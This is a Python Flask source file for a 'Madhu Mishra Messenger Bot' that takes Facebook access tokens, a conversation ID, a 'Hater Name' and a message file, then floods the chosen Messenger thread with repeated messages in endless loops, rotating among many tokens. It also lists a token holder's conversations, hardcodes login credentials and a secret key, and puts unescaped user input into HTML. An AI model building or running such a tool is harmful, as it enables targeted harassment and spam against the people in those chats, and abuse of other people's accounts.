from flask import Flask, request, render_template_string, session, redirect, url_for, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import os
from collections import defaultdict
from datetime import datetime, timedelta
import pytz
import json
import hashlib
import sys

app = Flask(__name__)
app.secret_key = "SuperSecretKey2025_DEVILXD_MASTER"

# Updated credentials
USERNAME = "DEVILXD"
PASSWORD = "LORDX000"
ADMIN_USERNAME = "DEVILXD"
ADMIN_PASSWORD = "LORDX000"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Referer': 'https://www.facebook.com/'
}

stop_events = {}
threads = {}
task_count = 0
user_tasks = defaultdict(list)
task_info = {}
MAX_TASKS = 10000
conversation_info_cache = {}

# India timezone
ist = pytz.timezone('Asia/Kolkata')

def format_uptime(seconds):
    if seconds < 3600:
        return f"{int(seconds // 60)} minutes {int(seconds % 60)} seconds"
    elif seconds < 86400:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{int(hours)} hours {int(minutes)} minutes"
    else:
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        return f"{int(days)} days {int(hours)} hours"

def format_time_ago(timestamp):
    now = datetime.now(ist)
    diff = now - timestamp
    seconds = diff.total_seconds()
    
    if seconds < 60:
        return "just now"
    elif seconds < 3600:
        minutes = int(seconds // 60)
        return f"{minutes} minute{'s' if minutes > 1 else ''} ago"
    elif seconds < 86400:
        hours = int(seconds // 3600)
        return f"{hours} hour{'s' if hours > 1 else ''} ago"
    else:
        days = int(seconds // 86400)
        return f"{days} day{'s' if days > 1 else ''} ago"

def get_conversation_info(access_token, thread_id):
    if thread_id in conversation_info_cache:
        return conversation_info_cache[thread_id]
    
    try:
        api_url = f'https://graph.facebook.com/v17.0/{thread_id}'
        params = {
            'access_token': access_token,
            'fields': 'name,participants'
        }
        response = requests.get(api_url, params=params, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            conversation_name = data.get('name', 'Unknown Conversation')
            
            participants = []
            if 'participants' in data:
                if isinstance(data['participants'], dict) and 'data' in data['participants']:
                    participants = [p.get('name', 'Unknown') for p in data['participants']['data']]
                elif isinstance(data['participants'], list):
                    participants = [p.get('name', 'Unknown') for p in data['participants']]
            
            conversation_info = {
                'name': conversation_name,
                'participants': participants,
                'participant_count': len(participants)
            }
            
            conversation_info_cache[thread_id] = conversation_info
            return conversation_info
    except:
        pass
    
    return {
        'name': f"Conversation ({thread_id})",
        'participants': [],
        'participant_count': 0
    }

def send_messages(access_tokens, thread_id, hatersname, lastname, time_interval, messages, task_id, username):
    global task_count
    stop_event = stop_events[task_id]
    
    conversation_info = get_conversation_info(access_tokens[0], thread_id) if access_tokens else {
        'name': f"Conversation ({thread_id})",
        'participants': [],
        'participant_count': 0
    }
    
    task_info[task_id] = {
        'start_time': datetime.now(ist),
        'message_count': 0,
        'last_message': '',
        'last_message_time': None,
        'tokens_count': len(access_tokens),
        'username': username,
        'thread_id': thread_id,
        'conversation_name': conversation_info['name'],
        'participant_count': conversation_info['participant_count'],
        'hatersname': hatersname,
        'lastname': lastname,
        'status': 'running'
    }
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                message = f"{hatersname} {message1} {lastname}"
                parameters = {'access_token': access_token, 'message': message}
                
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        task_info[task_id]['message_count'] += 1
                        task_info[task_id]['last_message'] = message
                        task_info[task_id]['last_message_time'] = datetime.now(ist)
                except:
                    pass
                
                time.sleep(time_interval)
    
    task_count -= 1
    if username in user_tasks and task_id in user_tasks[username]:
        user_tasks[username].remove(task_id)
    
    if task_id in task_info:
        task_info[task_id]['status'] = 'stopped'
    
    if task_id in stop_events:
        del stop_events[task_id]
    if task_id in threads:
        del threads[task_id]

# Beautiful HTML/CSS Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Madhu Mishra - Premium Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            position: relative;
            overflow-x: hidden;
        }

        /* Animated background without image */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 50%, rgba(102, 126, 234, 0.1) 0%, transparent 50%),
                        radial-gradient(circle at 80% 80%, rgba(118, 75, 162, 0.1) 0%, transparent 50%);
            z-index: -2;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.3) 100%);
            z-index: -1;
        }

        /* Stars animation */
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 2s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.2); }
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Header Styles */
        .header {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }

        .header h1 {
            color: #fff;
            font-size: 2.5em;
            text-shadow: 0 0 20px rgba(255,255,255,0.5);
            animation: glow 2s ease-in-out infinite;
        }

        @keyframes glow {
            0%, 100% { text-shadow: 0 0 20px rgba(255,255,255,0.5); }
            50% { text-shadow: 0 0 40px rgba(255,255,255,0.8); }
        }

        .uptime {
            color: #4ade80;
            font-size: 1.1em;
            margin-top: 10px;
        }

        /* Button Styles */
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .btn:hover::before {
            width: 300px;
            height: 300px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }

        .btn-danger {
            background: linear-gradient(135deg, #f56565 0%, #ed64a6 100%);
            color: white;
        }

        .btn-success {
            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
            color: white;
        }

        .btn-info {
            background: linear-gradient(135deg, #4299e1 0%, #3182ce 100%);
            color: white;
        }

        .btn-warning {
            background: linear-gradient(135deg, #ed8936 0%, #dd6b20 100%);
            color: white;
        }

        /* Card Styles */
        .card {
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.2);
            transition: transform 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
        }

        .card h3 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 1.5em;
            border-left: 4px solid #667eea;
            padding-left: 15px;
        }

        /* Input Styles with Dynamic Color Change */
        .dynamic-input {
            width: 100%;
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            color: white;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(5px);
        }

        .dynamic-input:focus {
            outline: none;
            transform: scale(1.02);
            box-shadow: 0 0 20px currentColor;
        }

        select {
            width: 100%;
            padding: 12px 20px;
            border-radius: 10px;
            font-size: 16px;
            background: rgba(0,0,0,0.6);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
        }

        option {
            background: rgba(0,0,0,0.9);
        }

        /* Table Styles */
        .task-table {
            width: 100%;
            border-collapse: collapse;
            color: white;
        }

        .task-table th,
        .task-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .task-table th {
            background: rgba(102, 126, 234, 0.3);
            font-weight: bold;
        }

        .task-table tr:hover {
            background: rgba(255,255,255,0.1);
        }

        /* Status Badge */
        .status-badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            display: inline-block;
        }

        .status-running {
            background: #48bb78;
            color: white;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        /* Grid Layout */
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
            gap: 25px;
        }

        /* Login Box */
        .login-box {
            max-width: 450px;
            margin: 100px auto;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(15px);
            border-radius: 30px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }

        .login-box h2 {
            color: white;
            text-align: center;
            margin-bottom: 30px;
        }

        .login-tabs {
            display: flex;
            margin-bottom: 30px;
            border-bottom: 2px solid rgba(255,255,255,0.2);
        }

        .login-tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            cursor: pointer;
            color: rgba(255,255,255,0.6);
            transition: all 0.3s;
        }

        .login-tab.active {
            color: #667eea;
            border-bottom: 2px solid #667eea;
            margin-bottom: -2px;
        }

        .login-form {
            display: none;
        }

        .login-form.active {
            display: block;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .grid-2 {
                grid-template-columns: 1fr;
            }
            
            .btn {
                width: 100%;
                margin: 10px 0;
            }
        }

        /* Floating Animation */
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .float-animation {
            animation: float 3s ease-in-out infinite;
        }
    </style>
</head>
<body>
    <div class="stars" id="stars"></div>
    
    <div class="container">
        {% if not session.logged_in %}
        <!-- Login Page -->
        <div class="login-box">
            <h2>✨ Madhu Mishra Messenger ✨</h2>
            <div class="login-tabs">
                <div class="login-tab active" onclick="switchTab('user')">👤 User Login</div>
                <div class="login-tab" onclick="switchTab('admin')">👑 Admin Login</div>
            </div>
            
            <!-- User Login Form -->
            <div id="user-login" class="login-form active">
                <form method="post" action="/login">
                    <input type="hidden" name="login_type" value="user">
                    <input type="text" name="username" class="dynamic-input" placeholder="Username" required style="margin-bottom: 15px;"><br>
                    <input type="password" name="password" class="dynamic-input" placeholder="Password" required style="margin-bottom: 20px;"><br>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">User Login</button>
                </form>
            </div>
            
            <!-- Admin Login Form -->
            <div id="admin-login" class="login-form">
                <form method="post" action="/login">
                    <input type="hidden" name="login_type" value="admin">
                    <input type="text" name="username" class="dynamic-input" placeholder="Admin Username" required style="margin-bottom: 15px;"><br>
                    <input type="password" name="password" class="dynamic-input" placeholder="Admin Password" required style="margin-bottom: 20px;"><br>
                    <button type="submit" class="btn btn-danger" style="width: 100%;">Admin Login</button>
                </form>
            </div>
        </div>
        {% else %}
        <!-- Main Content -->
        <div class="header">
            <h1>🌙 Madhu Mishra Messenger Bot</h1>
            <div class="uptime">⏱️ Uptime: {{ uptime }}</div>
            <div style="margin-top: 15px;">
                <span class="status-badge status-running">● System Active</span>
                <span style="color: white; margin-left: 15px;">👤 Logged in as: {{ session.username }}</span>
                {% if session.is_admin %}
                <span style="color: #fbbf24; margin-left: 15px;">👑 Admin Mode</span>
                {% endif %}
            </div>
        </div>

        <div class="grid-2">
            <!-- Task Creation Form -->
            <div class="card">
                <h3>🚀 Create New Task</h3>
                <form method="post" action="/home" enctype="multipart/form-data">
                    <select name="tokenOption" required style="margin-bottom: 15px;">
                        <option value="single">🔑 Single Token</option>
                        <option value="multiple">📁 Token File (Multiple)</option>
                    </select><br>
                    <input type="text" name="singleToken" class="dynamic-input" id="token-input" placeholder="Enter Single Token" style="margin-bottom: 15px;"><br>
                    <input type="file" name="tokenFile" class="dynamic-input" style="margin-bottom: 15px;"><br>
                    <input type="text" name="threadId" class="dynamic-input" id="thread-input" placeholder="Conversation ID" required style="margin-bottom: 15px;"><br>
                    <input type="text" name="hatersname" class="dynamic-input" id="hater-input" placeholder="Hater Name" required style="margin-bottom: 15px;"><br>
                    <input type="text" name="lastname" class="dynamic-input" id="lastname-input" placeholder="Last Name" required style="margin-bottom: 15px;"><br>
                    <input type="number" name="time" class="dynamic-input" id="time-input" placeholder="Time Interval (seconds)" required style="margin-bottom: 15px;"><br>
                    <input type="file" name="txtFile" class="dynamic-input" required style="margin-bottom: 20px;"><br>
                    <button type="submit" class="btn btn-success">▶️ Start Task</button>
                </form>
            </div>

            <!-- Statistics -->
            <div class="card">
                <h3>📊 Statistics</h3>
                <div style="margin-bottom: 20px;">
                    <p style="color: white; margin: 10px 0;">📌 Your Active Tasks: <strong style="color: #4ade80;">{{ user_task_count }}</strong></p>
                    <p style="color: white; margin: 10px 0;">🌍 Global Active Tasks: <strong style="color: #fbbf24;">{{ task_count }}</strong> / {{ MAX_TASKS }}</p>
                    <p style="color: white; margin: 10px 0;">💾 Cache Size: <strong>{{ cache_size }}</strong> conversations</p>
                </div>
                <hr style="border-color: rgba(255,255,255,0.2); margin: 20px 0;">
                <div>
                    <h4 style="color: white; margin-bottom: 15px;">🔍 Quick Actions</h4>
                    <form method="post" action="/find_conversations" style="margin-bottom: 15px;">
                        <input type="text" name="token" class="dynamic-input" id="find-token" placeholder="Enter Token to Find Conversations" required style="margin-bottom: 10px;">
                        <button type="submit" class="btn btn-info">🔎 Find Conversations</button>
                    </form>
                    <form method="post" action="/check_status">
                        <input type="text" name="taskId" class="dynamic-input" id="status-input" placeholder="Enter Task ID to Check Status" required style="margin-bottom: 10px;">
                        <button type="submit" class="btn btn-primary">📋 Check Status</button>
                    </form>
                </div>
            </div>
        </div>

        <!-- Active Tasks Table -->
        <div class="card">
            <h3>📋 Active Tasks</h3>
            {% if user_tasks %}
            <table class="task-table">
                <thead>
                    <tr>
                        <th>Task ID</th>
                        <th>Conversation</th>
                        <th>Messages Sent</th>
                        <th>Status</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {% for task_id in user_tasks %}
                    {% if task_id in task_info %}
                    <tr>
                        <td>{{ task_id[:8] }}...</td>
                        <td>{{ task_info[task_id].conversation_name[:30] }}</td>
                        <td>{{ task_info[task_id].message_count }}</td>
                        <td><span class="status-badge status-running">Running</span></td>
                        <td>
                            <form method="post" action="/stop" style="display: inline;">
                                <input type="hidden" name="taskId" value="{{ task_id }}">
                                <button type="submit" class="btn btn-danger" style="padding: 5px 15px;">Stop</button>
                            </form>
                        </td>
                    </tr>
                    {% endif %}
                    {% endfor %}
                </tbody>
            </table>
            {% else %}
            <p style="color: rgba(255,255,255,0.7); text-align: center;">No active tasks found. Create your first task above! 🚀</p>
            {% endif %}
        </div>

        <!-- Admin Panel (Visible only to admins) -->
        {% if session.is_admin %}
        <div class="card">
            <h3>👑 Admin Panel - All Tasks</h3>
            {% if task_info %}
            <table class="task-table">
                <thead>
                    <tr>
                        <th>Task ID</th>
                        <th>User</th>
                        <th>Conversation</th>
                        <th>Messages</th>
                        <th>Uptime</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {% for task_id, info in task_info.items() %}
                    <tr>
                        <td>{{ task_id[:8] }}...</td>
                        <td>{{ info.username }}</td>
                        <td>{{ info.conversation_name[:25] }}</td>
                        <td>{{ info.message_count }}</td>
                        <td>{{ format_uptime((now - info.start_time).total_seconds()) }}</td>
                        <td>
                            <form method="post" action="/stop" style="display: inline;">
                                <input type="hidden" name="taskId" value="{{ task_id }}">
                                <button type="submit" class="btn btn-danger" style="padding: 5px 15px;">Stop</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
            {% else %}
            <p style="color: rgba(255,255,255,0.7); text-align: center;">No tasks running</p>
            {% endif %}
        </div>
        {% endif %}

        <div style="text-align: center; margin-top: 20px;">
            <a href="/logout" class="btn btn-danger">🚪 Logout</a>
        </div>
        {% endif %}
    </div>

    <script>
        // Tab switching function
        function switchTab(type) {
            const userForm = document.getElementById('user-login');
            const adminForm = document.getElementById('admin-login');
            const tabs = document.querySelectorAll('.login-tab');
            
            if (type === 'user') {
                userForm.classList.add('active');
                adminForm.classList.remove('active');
                tabs[0].classList.add('active');
                tabs[1].classList.remove('active');
            } else {
                userForm.classList.remove('active');
                adminForm.classList.add('active');
                tabs[0].classList.remove('active');
                tabs[1].classList.add('active');
            }
        }
        
        // Dynamic color changing for input boxes
        const colors = [
            '#ff6464', '#64ff64', '#6464ff', '#ffff64', '#ff64ff',
            '#64ffff', '#ff9640', '#9632ff', '#32ff96', '#ff3296',
            '#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#ffeaa7',
            '#dfe6e9', '#74b9ff', '#a29bfe', '#fd79a8', '#fdcb6e'
        ];
        
        let colorIndex = 0;
        
        function changeInputColors() {
            const inputs = document.querySelectorAll('.dynamic-input');
            inputs.forEach(input => {
                const randomColor = colors[Math.floor(Math.random() * colors.length)];
                input.style.backgroundColor = randomColor + '33';
                input.style.borderLeft = `4px solid ${randomColor}`;
                input.style.boxShadow = `0 0 10px ${randomColor}`;
            });
        }
        
        // Change colors every 2 seconds
        setInterval(changeInputColors, 2000);
        
        // Add glow effect on focus
        document.querySelectorAll('.dynamic-input').forEach(input => {
            input.addEventListener('focus', function() {
                const randomColor = colors[Math.floor(Math.random() * colors.length)];
                this.style.boxShadow = `0 0 25px ${randomColor}`;
                this.style.transform = 'scale(1.02)';
            });
            
            input.addEventListener('blur', function() {
                this.style.transform = 'scale(1)';
            });
            
            input.addEventListener('touchstart', function() {
                const randomColor = colors[Math.floor(Math.random() * colors.length)];
                this.style.boxShadow = `0 0 30px ${randomColor}`;
            });
        });
        
        // Create stars
        function createStars() {
            const starsContainer = document.getElementById('stars');
            for (let i = 0; i < 200; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.width = Math.random() * 3 + 1 + 'px';
                star.style.height = star.style.width;
                star.style.animationDelay = Math.random() * 2 + 's';
                star.style.animationDuration = Math.random() * 2 + 1 + 's';
                starsContainer.appendChild(star);
            }
        }
        
        createStars();
        
        // Initial color set
        setTimeout(changeInputColors, 100);
    </script>
</body>
</html>
'''

@app.route('/', methods=['GET'])
def index():
    return redirect(url_for('login_page'))

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        login_type = request.form.get('login_type', 'user')
        username = request.form.get('username')
        password = request.form.get('password')
        
        if login_type == 'admin':
            if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
                session['logged_in'] = True
                session['username'] = username
                session['is_admin'] = True
                return redirect(url_for('send_message'))
        else:
            if username == USERNAME and password == PASSWORD:
                session['logged_in'] = True
                session['username'] = username
                session['is_admin'] = False
                return redirect(url_for('send_message'))
        
        return '''
        <div style="text-align: center; margin-top: 100px;">
            <h2 style="color: white;">❌ Invalid Username or Password!</h2>
            <a href="/" style="color: white;">Go Back</a>
        </div>
        '''
    
    uptime_str = format_uptime(732000)
    
    return render_template_string(HTML_TEMPLATE, session=session, uptime=uptime_str,
                                   user_task_count=0, task_count=0, MAX_TASKS=MAX_TASKS,
                                   cache_size=0, user_tasks=[], task_info={}, now=datetime.now(ist),
                                   format_uptime=format_uptime)

@app.route('/home', methods=['GET', 'POST'])
def send_message():
    global task_count
    if not session.get('logged_in'):
        return redirect(url_for('login_page'))

    username = session.get('username')
    is_admin = session.get('is_admin', False)
    
    if request.method == 'POST':
        if task_count >= MAX_TASKS:
            return '''
            <div style="text-align: center; margin-top: 100px;">
                <h2 style="color: white;">⚠️ Monthly Task Limit Reached!</h2>
                <a href="/home" style="color: white;">Go Back</a>
            </div>
            '''

        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken').strip()]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId').strip()
        hatersname = request.form.get('hatersname').strip()
        lastname = request.form.get('lastname').strip()
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, hatersname, lastname, time_interval, messages, task_id, username))
        threads[task_id] = thread
        thread.start()
        
        user_tasks[username].append(task_id)
        task_count += 1
        
        return f'''
        <div style="text-align: center; margin-top: 100px;">
            <h2 style="color: white;">✅ Task started successfully!</h2>
            <p style="color: white;">Task ID: <strong>{task_id}</strong></p>
            <a href="/home" style="color: white;">Back to Dashboard</a>
        </div>
        '''

    user_active_tasks = [t for t in user_tasks.get(username, []) if t in task_info]
    user_task_count = len(user_active_tasks)
    
    uptime_str = format_uptime(732000)
    
    return render_template_string(HTML_TEMPLATE, session=session, uptime=uptime_str,
                                   user_task_count=user_task_count, task_count=task_count,
                                   MAX_TASKS=MAX_TASKS, cache_size=len(conversation_info_cache),
                                   user_tasks=user_active_tasks, task_info=task_info,
                                   now=datetime.now(ist), format_uptime=format_uptime)

@app.route('/find_conversations', methods=['POST'])
def find_conversations():
    if not session.get('logged_in'):
        return redirect(url_for('login_page'))
    
    token = request.form.get('token').strip()
    
    try:
        verify_url = 'https://graph.facebook.com/v17.0/me'
        verify_params = {'access_token': token, 'fields': 'id,name'}
        verify_response = requests.get(verify_url, params=verify_params, headers=headers, timeout=10)
        
        if verify_response.status_code != 200:
            return '''
            <div style="text-align: center; margin-top: 100px;">
                <h2 style="color: white;">❌ Invalid token!</h2>
                <a href="/home" style="color: white;">Go Back</a>
            </div>
            '''
        
        api_url = 'https://graph.facebook.com/v17.0/me/conversations'
        params = {
            'access_token': token,
            'fields': 'id,name,participants',
            'limit': 100
        }
        response = requests.get(api_url, params=params, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            conversations = data.get('data', [])
            
            processed_conversations = []
            for conv in conversations:
                conv_id = conv.get('id', '')
                conv_name = conv.get('name', '')
                
                participant_count = 0
                if 'participants' in conv:
                    if isinstance(conv['participants'], dict) and 'data' in conv['participants']:
                        participant_count = len(conv['participants']['data'])
                    elif isinstance(conv['participants'], list):
                        participant_count = len(conv['participants'])
                
                if not conv_name and 'participants' in conv:
                    participant_names = []
                    if isinstance(conv['participants'], dict) and 'data' in conv['participants']:
                        participant_names = [p.get('name', '') for p in conv['participants']['data'] if p.get('name')]
                    elif isinstance(conv['participants'], list):
                        participant_names = [p.get('name', '') for p in conv['participants'] if p.get('name')]
                    
                    if participant_names:
                        conv_name = ", ".join(participant_names[:3])
                        if len(participant_names) > 3:
                            conv_name += f" and {len(participant_names) - 3} more"
                
                processed_conversations.append({
                    'id': conv_id,
                    'name': conv_name or f"Conversation {conv_id[:10]}...",
                    'participant_count': participant_count
                })
            
            return f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Conversations - Madhu Mishra</title>
                <style>
                    body {{
                        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                        font-family: 'Segoe UI', sans-serif;
                        padding: 50px;
                        color: white;
                    }}
                    .container {{
                        max-width: 800px;
                        margin: 0 auto;
                    }}
                    .conv-card {{
                        background: rgba(0,0,0,0.5);
                        backdrop-filter: blur(10px);
                        border-radius: 15px;
                        padding: 20px;
                        margin-bottom: 15px;
                        transition: transform 0.3s;
                    }}
                    .conv-card:hover {{
                        transform: translateX(10px);
                    }}
                    .conv-id {{
                        font-family: monospace;
                        background: rgba(255,255,255,0.2);
                        padding: 5px 10px;
                        border-radius: 5px;
                        display: inline-block;
                    }}
                    .copy-btn {{
                        background: #48bb78;
                        color: white;
                        border: none;
                        padding: 5px 15px;
                        border-radius: 5px;
                        cursor: pointer;
                        margin-left: 10px;
                    }}
                    .btn-back {{
                        background: #f56565;
                        color: white;
                        padding: 12px 30px;
                        border: none;
                        border-radius: 50px;
                        cursor: pointer;
                        text-decoration: none;
                        display: inline-block;
                        margin-top: 20px;
                    }}
                </style>
                <script>
                    function copyId(id) {{
                        navigator.clipboard.writeText(id);
                        alert('Conversation ID copied: ' + id);
                    }}
                </script>
            </head>
            <body>
                <div class="container">
                    <h1>📋 Your Messenger Conversations</h1>
                    <p>Found {len(processed_conversations)} conversations</p>
                    {'<br>'.join([f'''
                    <div class="conv-card">
                        <h3>{conv['name']}</h3>
                        <p><span class="conv-id">{conv['id']}</span>
                        <button class="copy-btn" onclick="copyId('{conv['id']}')">Copy ID</button></p>
                        <p>👥 Participants: {conv['participant_count']}</p>
                    </div>
                    ''' for conv in processed_conversations])}
                    <br>
                    <a href="/home" class="btn-back">← Back to Dashboard</a>
                </div>
            </body>
            </html>
            '''
        else:
            return f'''
            <div style="text-align: center; margin-top: 100px;">
                <h2 style="color: white;">❌ Failed to fetch conversations</h2>
                <a href="/home" style="color: white;">Go Back</a>
            </div>
            '''
    except Exception as e:
        return f'''
        <div style="text-align: center; margin-top: 100px;">
            <h2 style="color: white;">❌ Error: {str(e)}</h2>
            <a href="/home" style="color: white;">Go Back</a>
        </div>
        '''

@app.route('/check_status', methods=['POST'])
def check_status():
    if not session.get('logged_in'):
        return redirect(url_for('login_page'))
    
    username = session.get('username')
    task_id = request.form.get('taskId')
    is_admin = session.get('is_admin', False)
    
    if task_id in task_info and (is_admin or (username in user_tasks and task_id in user_tasks[username])):
        info = task_info[task_id]
        uptime = (datetime.now(ist) - info['start_time']).total_seconds()
        
        last_msg_time = "Not sent yet"
        if info['last_message_time']:
            last_msg_time = f"{info['last_message_time'].strftime('%Y-%m-%d %H:%M:%S')} IST"
        
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Task Status - Madhu Mishra</title>
            <style>
                body {{
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                    font-family: 'Segoe UI', sans-serif;
                    padding: 50px;
                    color: white;
                }}
                .status-card {{
                    background: rgba(0,0,0,0.6);
                    backdrop-filter: blur(10px);
                    border-radius: 20px;
                    padding: 30px;
                    max-width: 600px;
                    margin: 0 auto;
                }}
                .status-item {{
                    margin: 15px 0;
                    padding: 10px;
                    border-left: 3px solid #48bb78;
                }}
                .btn-back {{
                    background: #f56565;
                    color: white;
                    padding: 12px 30px;
                    border: none;
                    border-radius: 50px;
                    cursor: pointer;
                    text-decoration: none;
                    display: inline-block;
                    margin-top: 20px;
                }}
                .status-badge {{
                    background: #48bb78;
                    padding: 5px 15px;
                    border-radius: 20px;
                    display: inline-block;
                }}
            </style>
        </head>
        <body>
            <div class="status-card">
                <h1>📊 Task Status: {task_id[:12]}...</h1>
                <div class="status-item">⏱️ Uptime: {format_uptime(uptime)}</div>
                <div class="status-item">💬 Messages Sent: <strong>{info['message_count']}</strong></div>
                <div class="status-item">🔑 Tokens Used: {info['tokens_count']}</div>
                <div class="status-item">💬 Conversation: {info['conversation_name']}</div>
                <div class="status-item">👥 Participants: {info['participant_count']}</div>
                <div class="status-item">😈 Hater Name: {info['hatersname']}</div>
                <div class="status-item">📝 Last Message: {info['last_message'][:50]}...</div>
                <div class="status-item">🕐 Last Message Time: {last_msg_time}</div>
                <div class="status-item">👤 Started By: {info['username']}</div>
                <div class="status-item">📌 Status: <span class="status-badge">● RUNNING</span></div>
                <form method="post" action="/stop" style="display: inline-block; margin-top: 20px;">
                    <input type="hidden" name="taskId" value="{task_id}">
                    <button type="submit" class="btn-back" style="background: #ed64a6;">⏹️ Stop Task</button>
                </form>
                <a href="/home" class="btn-back" style="margin-left: 10px;">← Back</a>
            </div>
        </body>
        </html>
        '''
    
    return '''
    <div style="text-align: center; margin-top: 100px;">
        <h2 style="color: white;">❌ Invalid Task ID or permission denied!</h2>
        <a href="/home" style="color: white;">Go Back</a>
    </div>
    '''

@app.route('/stop', methods=['POST'])
def stop_task():
    global task_count
    if not session.get('logged_in'):
        return redirect(url_for('login_page'))

    task_id = request.form.get('taskId')
    username = session.get('username')
    is_admin = session.get('is_admin', False)
    
    if task_id in stop_events and (is_admin or (username in user_tasks and task_id in user_tasks[username])):
        stop_events[task_id].set()
        task_count -= 1
        return f'''
        <div style="text-align: center; margin-top: 100px;">
            <h2 style="color: white;">✅ Task {task_id} stopped successfully!</h2>
            <a href="/home" style="color: white;">Back to Dashboard</a>
        </div>
        '''
    
    return '''
    <div style="text-align: center; margin-top: 100px;">
        <h2 style="color: white;">❌ Invalid Task ID or permission denied!</h2>
        <a href="/home" style="color: white;">Go Back</a>
    </div>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    session.pop('is_admin', None)
    return redirect(url_for('login_page'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
